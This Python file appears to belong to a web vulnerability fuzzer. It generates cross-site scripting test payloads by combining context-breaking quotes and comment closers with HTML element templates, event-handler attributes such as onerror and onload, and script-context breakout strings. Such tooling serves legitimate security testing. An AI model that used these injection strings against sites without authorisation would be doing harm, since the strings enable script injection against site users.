class fuzzer_payloads:
    @staticmethod
    def xss():

        # xss bypass
        closed = [
            '',
            '"',
            '\'',
            ';',
            '";',
            '\';',
            '>',
            '\'>',
            '">',
            '</>',
            '-->',
            '--!>',
            '!-->',
            '->',
            '--',
        ]
        # find_all(name=[for i in element_xss])
        element_xss= [
            '<h1{0}>{1}</h1>',
            '<fuzzing{0}>{1}</fuzzing>',
            '<a{0}>{1}</a>',
        ]
        # Response strings find
        script_xss = [
            "{0}",
            "';//{0}",
            "\";//{0}",
            ";//{0}",
            ");//{0}",
            "));//{0}",
            ")));//{0}",
            "');//{0}",
            "'));//{0}",
            "')));//{0}",
            "\");//{0}",
            "\"));//{0}",
            "\")));//{0}"
        ]

        # find_all(attrs={'event name':'alert(1)'})
        attribute_xss = [
            '{0}onafterprint={1}',
            '{0}onbeforeprint={1}',
            '{0}onbeforeunload={1}',
            '{0}onerror={1}',
            '{0}onhashchange={1}',
            '{0}onload={1}',
            '{0}onmessage={1}',
            '{0}onoffline={1}',
            '{0}ononline={1}',
            '{0}onpagehide={1}',
            '{0}onpageshow={1}',
            '{0}onpopstate={1}',
            '{0}onresize={1}',
            '{0}onstorage={1}',
            '{0}onunload={1}',
            '{0}onblur={1}',
            '{0}onchange={1}',
            '{0}oncontextmenu={1}',
            '{0}onfocus={1}',
            '{0}oninput={1}',
            '{0}oninvalid={1}',
            '{0}onreset={1}',
            '{0}onsearch={1}',
            '{0}onselect={1}',
            '{0}onsubmit={1}',
            '{0}onkeydown={1}',
            '{0}onkeypress={1}',
            '{0}onkeyup={1}',
            '{0}onclick={1}',
            '{0}ondblclick={1}',
            '{0}onmousedown={1}',
            '{0}onmousemove={1}',
            '{0}onmouseout={1}',
            '{0}onmouseover={1}',
            '{0}onmouseup={1}',
            '{0}onmousewheel={1}',
            '{0}onwheel={1}',
            '{0}ondrag={1}',
            '{0}ondragend={1}',
            '{0}ondragenter={1}',
            '{0}ondragleave={1}',
            '{0}ondragover={1}',
            '{0}ondragstart={1}',
            '{0}ondrop={1}',
            '{0}onscroll={1}',
            '{0}oncopy={1}',
            '{0}oncut={1}',
            '{0}onpaste={1}',
            '{0}onabort={1}',
            '{0}oncanplay={1}',
            '{0}oncanplaythrough={1}',
            '{0}oncuechange={1}',
            '{0}ondurationchange={1}',
            '{0}onemptied={1}',
            '{0}onended={1}',
            '{0}onerror={1}',
            '{0}onloadeddata={1}',
            '{0}onloadedmetadata={1}',
            '{0}onloadstart={1}',
            '{0}onpause={1}',
            '{0}onplay={1}',
            '{0}onplaying={1}',
            '{0}onprogress={1}',
            '{0}onratechange={1}',
            '{0}onseeked={1}',
            '{0}onseeking={1}',
            '{0}onstalled={1}',
            '{0}onsuspend={1}',
            '{0}ontimeupdate={1}',
            '{0}onvolumechange={1}',
            '{0}onwaiting={1}',
            '{0}ontoggle={1}',
        ]

        """
        onafterprint	    script	Script to be run after the document is printed
        onbeforeprint	    script	Script to be run before the document is printed
        onbeforeunload	    script	Script to be run when the document is about to be unloaded
        onerror	            script	Script to be run when an error occurs
        onhashchange	    script	Script to be run when there has been changes to the anchor part of the a URL
        onload	            script	Fires after the page is finished loading
        onmessage	        script	Script to be run when the message is triggered
        onoffline	        script	Script to be run when the browser starts to work offline
        ononline	        script	Script to be run when the browser starts to work online
        onpagehide	        script	Script to be run when a user navigates away from a page
        onpageshow	        script	Script to be run when a user navigates to a page
        onpopstate	        script	Script to be run when the window's history changes
        onresize	        script	Fires when the browser window is resized
        onstorage	        script	Script to be run when a Web Storage area is updated
        onunload	        script	Fires once a page has unloaded (or the browser window has been closed)
        onblur	            script	Fires the moment that the element loses focus
        onchange	        script	Fires the moment when the value of the element is changed
        oncontextmenu	    script	Script to be run when a context menu is triggered
        onfocus	            script	Fires the moment when the element gets focus
        oninput	            script	Script to be run when an element gets user input
        oninvalid	        script	Script to be run when an element is invalid
        onreset	            script	Fires when the Reset button in a form is clicked
        onsearch	        script	Fires when the user writes something in a search field (for <input="search">)
        onselect	        script	Fires after some text has been selected in an element
        onsubmit	        script	Fires when a form is submitted
        onkeydown	        script	Fires when a user is pressing a key
        onkeypress	        script	Fires when a user presses a key
        onkeyup	            script	Fires when a user releases a key
        onclick	            script	Fires on a mouse click on the element
        ondblclick	        script	Fires on a mouse double-click on the element
        onmousedown	        script	Fires when a mouse button is pressed down on an element
        onmousemove	        script	Fires when the mouse pointer is moving while it is over an element
        onmouseout	        script	Fires when the mouse pointer moves out of an element
        onmouseover	        script	Fires when the mouse pointer moves over an element
        onmouseup	        script	Fires when a mouse button is released over an element
        onmousewheel        script	Deprecated. Use the onwheel attribute instead
        onwheel	            script	Fires when the mouse wheel rolls up or down over an element
        ondrag	            script	Script to be run when an element is dragged
        ondragend	        script	Script to be run at the end of a drag operation
        ondragenter	        script	Script to be run when an element has been dragged to a valid drop target
        ondragleave	        script	Script to be run when an element leaves a valid drop target
        ondragover	        script	Script to be run when an element is being dragged over a valid drop target
        ondragstart	        script	Script to be run at the start of a drag operation
        ondrop	            script	Script to be run when dragged element is being dropped
        onscroll	        script	Script to be run when an element's scrollbar is being scrolled
        oncopy	            script	Fires when the user copies the content of an element
        oncut	            script	Fires when the user cuts the content of an element
        onpaste	            script	Fires when the user pastes some content in an element
        onabort     	    script	Script to be run on abort
        oncanplay	        script	Script to be run when a file is ready to start playing (when it has buffered enough to begin)
        oncanplaythrough	script	Script to be run when a file can be played all the way to the end without pausing for buffering
        oncuechange	        script	Script to be run when the cue changes in a <track> element
        ondurationchange	script	Script to be run when the length of the media changes
        onemptied	        script	Script to be run when something bad happens and the file is suddenly unavailable (like unexpectedly disconnects)
        onended	            script	Script to be run when the media has reach the end (a useful event for messages like "thanks for listening")
        onerror	            script	Script to be run when an error occurs when the file is being loaded
        onloadeddata	    script	Script to be run when media data is loaded
        onloadedmetadata	script	Script to be run when meta data (like dimensions and duration) are loaded
        onloadstart	        script	Script to be run just as the file begins to load before anything is actually loaded
        onpause	            script	Script to be run when the media is paused either by the user or programmatically
        onplay	            script	Script to be run when the media is ready to start playing
        onplaying	        script	Script to be run when the media actually has started playing
        onprogress	        script	Script to be run when the browser is in the process of getting the media data
        onratechange	    script	Script to be run each time the playback rate changes (like when a user switches to a slow motion or fast forward mode)
        onseeked	        script	Script to be run when the seeking attribute is set to false indicating that seeking has ended
        onseeking	        script	Script to be run when the seeking attribute is set to true indicating that seeking is active
        onstalled	        script	Script to be run when the browser is unable to fetch the media data for whatever reason
        onsuspend	        script	Script to be run when fetching the media data is stopped before it is completely loaded for whatever reason
        ontimeupdate	    script	Script to be run when the playing position has changed (like when the user fast forwards to a different point in the media)
        onvolumechange	    script	Script to be run each time the volume is changed which (includes setting the volume to "mute")
        onwaiting	        script	Script to be run when the media has paused but is expected to resume (like when the media pauses to buffer more data)
        ontoggle	        script	Fires when the user opens or closes the <details> element
        """

        # element_xss , attribute_xss, script_xss = fuzzer_payloads.xss()
        return (element_xss + [f"{exit}{element}" for element in element_xss for exit in closed]), (attribute_xss + [f"{i.format(j, '{0}')}" for i in attribute_xss for j in ["\" ", "' ", "0 ","\"/", "'/","0/ "]]), (script_xss)